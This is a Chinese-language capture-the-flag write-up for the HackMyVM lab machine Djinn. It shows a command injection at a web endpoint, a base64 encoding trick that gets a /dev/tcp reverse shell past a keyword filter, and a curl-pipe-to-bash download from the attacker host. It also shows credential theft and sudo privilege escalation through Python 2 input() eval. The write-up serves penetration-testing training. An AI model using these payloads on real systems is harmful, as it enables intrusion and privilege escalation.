# Djinn

2025.02.15 https://hackmyvm.eu/machines/machine.php?vm=Djinn

## Ip

192.168.5.40

## Scan

```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
1337/tcp open  waste
7331/tcp open  swx
```

ftp 可以匿名登陆，将其内容全部下载后查看。

```
nitu:81299

oh and I forgot to tell you I've setup a game for you on port 1337. See if you can reach to the
final level and get the prize.

@nitish81299 I am going on holidays for few days, please take care of all the work.
And don't mess up anything.
```

说 1337 端口上有一个游戏，使用 nc 进行连接，发现是个计算游戏，但是好像没看出什么漏洞，估计是个兔子洞。

在看 7331 这个端口，是个 web 页面，源码中也没什么信息，使用 gobuster 进行扫描，发现了 http://192.168.5.40:7331/wish 这里实现命令执行：

```
curl --data-urlencode "cmd=whoami" http://192.168.5.40:7331/wish
```

直接在 kali 上建立监听，然后执行反弹：

```
nc -lvnp 8888
curl --data-urlencode "cmd=/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1'" http://192.168.5.40:7331/wish
```

这里不能执行，显示 Wrong choice of words 应该是后台有过滤，需要绕过，尝试用 base64 进行绕过：

```
curl --data-urlencode "cmd=echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|bash" http://192.168.5.40:7331/wish

root:x:0:0:root:/root:/bin/bash
sam:x:1000:1000:sam,,,:/home/sam:/bin/bash
nitish:x:1001:1001::/home/nitish:/bin/bash
```

```
curl --data-urlencode "cmd=echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|bash" http://192.168.5.40:7331/wish
```

对下面的代码进行 base64：

```
/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1'

L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC41LjMvODg4OCAwPiYxJw==
```

然后执行：

```
curl --data-urlencode "cmd=echo L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC41LjMvODg4OCAwPiYxJw==|base64 -d|bash" http://192.168.5.40:7331/wish
```

这时在 kali 上得到了反弹的 shell：

```
www-data@djinn:/opt/80$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

然后发现了一个用户登陆凭据：

```
www-data@djinn:/home/nitish$ cat .dev/creds.txt
nitish:p4ssw0rdStr3r0n9
```

su 切换到 nitish 用户，得到了 user flag：

```
nitish@djinn:~$ cat user.txt
HMV{WW91IGZvdW5kIHRoZSBmaXJzdCBzdGVw}
```

sudo -l 发现 (sam) NOPASSWD: /usr/bin/genie 可以直接提权到 sam 用户：

```
sudo -u sam /usr/bin/genie -c 'curl http://192.168.5.3/5-3/8888.sh|bash'
```

但是出现提示：Pass your wish to GOD, he might be able to help you. 应该是有过滤。尝试找到更多的命令帮助 man genie 发现了一个参数 -cmd ：

```
-cmd
You know sometime all you new is a damn CMD, windows I love you.
```

sudo -u sam genie -cmd whoami 执行后，得到了 sam 权限，sudo -l 发现另外的命令： (root) NOPASSWD: /root/lago , 但是没有执行权限。

发现 sam 用户属于 lxd 用户组，想着借助 lxd 提权，但是提示有问题：

```
Error: Unable to read the configuration file: open /home/nitish/.config/lxc/config.yml: permission denied
```

发现在 sam 目录中有一个 .pyc 文件，将其反编译，得到源码：

```python
#!/usr/bin/env python
# visit https://tool.lu/pyc/ for more information
# Version: Python 2.7

from getpass import getuser
from os import system
from random import randint

def naughtyboi():
    print 'Working on it!! '


def guessit():
    num = randint(1, 101)
    print 'Choose a number between 1 to 100: '
    s = input('Enter your number: ')
    if s == num:
        system('/bin/sh')
    else:
        print 'Better Luck next time'


def readfiles():
    user = getuser()
    path = input('Enter the full of the file to read: ')
    print 'User %s is not allowed to read %s' % (user, path)


def options():
    print 'What do you want to do ?'
    print '1 - Be naughty'
    print '2 - Guess the number'
    print '3 - Read some damn files'
    print '4 - Work'
    choice = int(input('Enter your choice: '))
    return choice


def main(op):
    if op == 1:
        naughtyboi()
    elif op == 2:
        guessit()
    elif op == 3:
        readfiles()
    elif op == 4:
        print 'work your ass off!!'
    else:
        print 'Do something better with your life'

if __name__ == '__main__':
    main(options())
```

sudo -l 发现 (root) NOPASSWD: /root/lago ，先尝试执行：

```
sudo -u root /root/lago
```

发现程序显示的内容和上面的 pyc 代码反编译出来的一致，找到执行逻辑，发现 guessit() 可以执行命令，输入 2 和 num 直接得到了 root 权限：

```
sam@djinn:/home/sam$ sudo -u root /root/lago
What do you want to do ?
1 - Be naughty
2 - Guess the number
3 - Read some damn files
4 - Work
Enter your choice:2
Choose a number between 1 to 100:
Enter your number: num
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
lago  root.txt
# cat root.txt
HMV{eWVzIHlvdSBhcmUgY29vbA==}
```
